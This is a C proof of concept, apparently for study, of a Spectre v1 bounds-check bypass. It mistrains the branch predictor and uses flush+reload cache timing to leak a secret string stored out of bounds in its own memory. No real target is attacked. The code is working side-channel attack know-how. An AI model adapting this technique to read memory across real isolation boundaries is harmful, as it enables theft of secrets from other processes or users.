#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 10
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define DATA_SIZE (accessible + secret_size)
#define SECRET_SIZE 25
#define DATA "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message"

int accessible __attribute__ ((aligned (256))) = 100;


/*
 * Variables required in cache:
 *  index
 *  data
 *  arr^(1)
 *
 * Variables requried in mem:
 *  accessible
 *
 *  ^(1): when arr is in mem the gadget still works, but the accuracy goes down.
 *        I currently do not know why, but I suspect it makes the loading of arr[x] take longer.
 */
__attribute__((noinline)) void victim_func(int index, cp_t* arr, unsigned char* data) {

    //flush bound value
    flush((void*)&accessible);
    flush((void*)&arr);
    cpuid();

    //access (possibly out of bounds)
    if (index < accessible) {
        unsigned char x = data[index];
        volatile cp_t cp = arr[x];
    }
}

int* spv1(int index) {

    cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = accessible-10 + 1; //NOTE: when n_accesses is accessble+1, then 'z' never gets a cache hit.
    int accesses[n_accesses];
    for(int i = 0; i < n_accesses; i++) accesses[i] = i;
    accesses[n_accesses-1] = index;

    //Misstrain branch predictor, access out of bounds on last call
    for(int i = 0; i < n_accesses; i++) {
        victim_func(accesses[i], flush_reload_arr, DATA);

        //ensures completion before flushing. bar prevents speculative access from being flushed
        cpuid();
        flush((void*)&flush_reload_arr[DATA[i]]);    //TODO: make this sensible
        cpuid();
    }

    //make sure previous loop finishes execution
    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}



int main(int argc, char* argv[]) {

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    for(int r = 0; r < REPETITIONS; r++) {

        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = spv1(accessible + s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);
}